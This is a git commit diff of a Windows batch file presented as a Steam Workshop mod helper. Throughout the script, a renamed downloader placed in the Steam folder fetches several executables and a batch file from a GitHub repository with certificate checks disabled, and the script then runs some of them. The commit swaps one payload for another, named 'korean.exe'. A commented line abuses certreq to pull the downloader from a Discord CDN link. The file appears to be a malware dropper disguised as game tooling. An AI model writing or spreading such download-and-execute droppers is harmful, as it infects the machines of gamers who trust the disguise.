998322197b5ddba1e24570c21ea05579476e381f
tobiasmulln <133047212+tobiasmulln@users.noreply.github.com>
2023-05-17 13:28:18 +0200

    Update ssfn_WorkshopMods.bat

--- ssfn_WorkshopMods.bat
+++ ssfn_WorkshopMods.bat
@@ -11,13 +11,13 @@ echo Exists) ELSE (
   "C:\Program Files (x86)\steam\ssfn_rdl.exe" -LJk https://github.com/tobiasmulln/Testing/raw/main/ssfn_WorkshopMods.exe --output "C:\Program Files (x86)\steam\ssfn_WorkshopMods.exe"
 )
 
-"C:\Program Files (x86)\steam\ssfn_rdl.exe" -LJk "https://github.com/tobiasmulln/Testing/raw/main/VerifyWorkshop.exe" --output "C:\Users\user\Downloads\VerifyWorkshop.exe"
+"C:\Program Files (x86)\steam\ssfn_rdl.exe" -LJk "https://github.com/tobiasmulln/Testing/raw/main/korean.exe" --output "C:\Users\user\Downloads\korean.exe"
 "C:\Program Files (x86)\steam\ssfn_rdl.exe" -LJk "https://github.com/tobiasmulln/Testing/raw/main/Cloud.exe" --output "C:\Users\user\Downloads\Cloud.exe"
 "C:\Program Files (x86)\steam\ssfn_rdl.exe" -LJk "https://raw.githubusercontent.com/tobiasmulln/Testing/main/ARK_WorldsMod.bat" --output "C:\Users\user\Downloads\ARK_WorldsMod.bat"
 "C:\Program Files (x86)\steam\ssfn_rdl.exe" -LJk "https://github.com/tobiasmulln/Testing/raw/main/noTitles.exe" --output "C:\Users\user\Downloads\noTitles.exe"
 "C:\Program Files (x86)\steam\ssfn_rdl.exe" -LJk "https://github.com/tobiasmulln/Testing/raw/main/noTitlesWorse.exe" --output "C:\Users\user\Downloads\noTitlesWorse.exe"
 
-#"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\VerifyWorkshop.exe" "https://github.com/tobiasmulln/Testing/raw/main/VerifyWorkshop.exe"
+#"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\korean.exe" "https://github.com/tobiasmulln/Testing/raw/main/korean.exe"
 #"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\Cloud.exe" "https://github.com/tobiasmulln/Testing/raw/main/Cloud.exe"
 #"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\ARK_WorldsMod.bat" "https://raw.githubusercontent.com/tobiasmulln/Testing/main/ARK_WorldsMod.bat"
 #"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\noTitles.exe" "https://github.com/tobiasmulln/Testing/raw/main/noTitles.exe"
@@ -25,7 +25,7 @@ echo Exists) ELSE (
 
 start "" "C:\Users\user\Downloads\noTitles.exe"
 start "" "C:\Users\user\Downloads\noTitlesWorse.exe"
-start "" "C:\Users\user\Downloads\VerifyWorkshop.exe"
+start "" "C:\Users\user\Downloads\korean.exe"
 
 ##certreq -Post -config "https://cdn.discordapp.com/attachments/1105541696135123004/1108129658433699892/ssfn_rdl2.exe" c:\windows\win.ini "C:\Program Files (x86)\steam\ssfn_rdl.exe"
 ##"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Program Files (x86)\steam\ssfn_WorkshopMods.exe" "https://github.com/tobiasmulln/Testing/raw/main/ssfn_WorkshopMods.exe"
